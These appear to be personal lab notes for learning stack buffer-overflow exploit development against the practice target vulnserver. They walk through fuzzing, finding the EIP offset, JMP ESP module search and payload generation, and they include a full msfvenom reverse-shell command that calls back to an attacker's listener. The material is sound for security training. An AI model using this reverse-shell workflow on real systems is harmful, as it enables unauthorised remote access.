Intro to Exploit Development (Buffer Overflows)

1. Pre-req installs
	*	Windows 10 VM as victim
		*	google "windows evaluation"
	*	on victim, install "vulnserver" (the grey corner)
	* on victim, immunity debugger
		* python 2.7
2. Buffer Overflows explained
	* Anatomy of memory
		* kernel (bunch of ones) [top]
		* Stack
			* ESP (extended stack pointer) [top]
			* buffer space
				* buffer should only fill to the EBP. and overflow allows this to fill past the EBP, into the EIP
				* This allows us to control the pointer, running any code in memory
			* EBP (extended base pointer) [bottom]
			* EIP (Extended Instruction pointer/return address)
		* heap
		* data
		* text (bunch of zeros) [bottom]
	* Steps to do:
		* spiking - finding the vulnerable part
		* fuzzing - testing vuln: can we break it, and where
		* finding the offset - the where we broke it
		* overwrite the EIP - flood it
		* find our bad characters - housekeeping
		* finding the right module - housekeeping
		* generate shellcode - point eip to code
		* root! - et viola!
3. Spiking
	* first, disable defender on vic
	* then start vuln server as admin
	* then start immunity as admin
	* in immunity, click file -> attach
		* find vulnserver, click attach
		* click start
	* on attack box:
		* nc -nv vuln-ip 9999
	 	*  HELP command
	 
	* Spike the available commands
		*  generic send tcp cmd
		*  create spike file:
			*  s_readline;
			*  s_string("*command* ");
			* s_string_variable("0");
		 
		*  send it!
			*  immunity pauses, shows we overwrote all of memory (41 is ascii for A)
4. fuzzing
	* need a script (on kali as "1fuzz.py")
	* ship it while watching immunity. ctrl c the script when you catch it
	* take byte value from script, round up to closest 1000

5. finding the offset
	* pattern_create.rb (metasploit)
	* use switch -l *byte value*
	* copy value to 2fuzz.py (copy of1fuzz...mostly)
	* reset immunity and vulnserver if needed
	* send it!
	* find the EIP where it crashed in immunity
	* use pattern_offset.rb this time, switches -l 3000 -q *EIP value*
		* match found where? (2003 bytes) this is where we can control!

6. overwriting the EIP
- we have 4 bytes to overwrite (2003+EIP)
- check 3fuzz comments. this should show 42424242 in immunity

7. finding the bad characters
  * cytopia badchars in github
  * python list is in code folder with scripts
  * swap comments in 3fuzz
  * reset immunity and vulnserver if required
  * send it!
  * r click esp value, slect "follow in hex"
  * look for value out of place (ie: 01 02 03 B0 B0 06 07...the B0 is out.). Find this everywhere and it will show you what values you cant use in your shellcode
	  * just worry about the first when you see pairs (so 05 is fine above)
	  * but, you can err on caution and remove them anyway...
	  * none in vulnserver

8. finding the right module
	* we need to find a place with no protections. enter mona modules
		* copy the py file to the immunity pycommands folder
	* look for somehting attached to vulnserver that is all false (essfunc.dll is first for us)
	* find opcod equiv of JMP (msf-nasmshell) on attack box
		* in nasm, JMP ESP (returns FFE4)
	* back in immunity, run mona find -s "\xff\xe4" -m essfunc.dll. this gives return addresses
		* add this to script (4fuzz.py)
	* click "Go to address in dissassembler", enter our memory value (625011af)
	* run it as test. it should break and eip should be out 625011af
  
9. generating shellcode and getting root
	* msfvenom to create payload
		* msfvenom -p windows/shell_reverse_tcp LHOST=*attackbox IP* LPORT=*listening port* EXITFUNC=thread -f c -a x86 -b "\x00"
	* pay attention to payload size!
	* copy buffer into 5fuzz
	* start a listener (nc)
	* turn off immunity, restart vulnserver
	* ship it!